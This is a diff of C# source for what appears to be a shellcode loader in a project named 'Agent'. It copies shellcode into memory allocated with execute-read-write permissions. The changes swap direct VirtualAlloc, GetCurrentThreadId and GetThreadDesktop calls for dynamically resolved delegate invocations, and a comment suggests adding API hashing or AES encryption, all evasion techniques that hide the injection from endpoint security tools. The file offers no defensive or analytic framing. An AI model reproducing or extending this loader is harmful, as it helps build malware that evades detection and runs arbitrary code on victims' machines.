@@ -41,8 +41,8 @@ namespace Agent
             List<string> resolveFuncs = new List<string>
             {
                 "va",
-                //"cgti",                //GetCurrentThreadId (kernel32.dll 9DF4CEF5B9AD88BF8DB22B3A55740BA0
-                //"gtd",                //GetThreadDesktop (user32.dll)
+                "gcti",                //GetCurrentThreadId (kernel32.dll 
+                "gtd",                //GetThreadDesktop (user32.dll)
                 //"edw"                //EnumDesktopWindows (user32.dll)
 
             };
@@ -54,7 +54,10 @@ namespace Agent
 
             //Injection code; optionally add API hashing or AES encryption
 
-            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            //IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            object[] vaParams = new object[] { IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE };
+            IntPtr funcAddr = Generic.InvokeFunc<IntPtr>(Resolver.GetFunc("va"), typeof(VADelegate), ref vaParams);
+
             if (funcAddr == IntPtr.Zero)
             {
                 Console.WriteLine("Memory allocation failed");
@@ -64,7 +67,23 @@ namespace Agent
 
             Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length);
 
-            IntPtr hDesktop = GetThreadDesktop(GetCurrentThreadId());
+            //IntPtr hDesktop = GetThreadDesktop(GetCurrentThreadId()); //adding deleegate
+
+            // Define parameters for GetThreadDesktop and GetCurrentThreadId
+            object[] gctParams = new object[] { }; // No parameters for GetCurrentThreadId
+            uint threadId = Generic.InvokeFunc<uint>(Resolver.GetFunc("gcti"), typeof(GCTDelegate), ref gctParams);
+
+            object[] gtdParams = new object[] { threadId }; // GetThreadDesktop takes the thread ID
+            IntPtr hDesktop = Generic.InvokeFunc<IntPtr>(Resolver.GetFunc("gtd"), typeof(GTDDelegate), ref gtdParams);
+
+
+
+
+
+
+
+
+
             if (hDesktop == IntPtr.Zero)
             {
                 Console.WriteLine("Failed to get desktop handle");
@@ -90,7 +109,7 @@ namespace Agent
         //ToBeImplemented
         private delegate IntPtr VADelegate(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);
         private delegate IntPtr GTDDelegate(uint dwThreadId);
-        private delegate uint GCT();
+        private delegate uint GCTDelegate();
 
 
         //constants
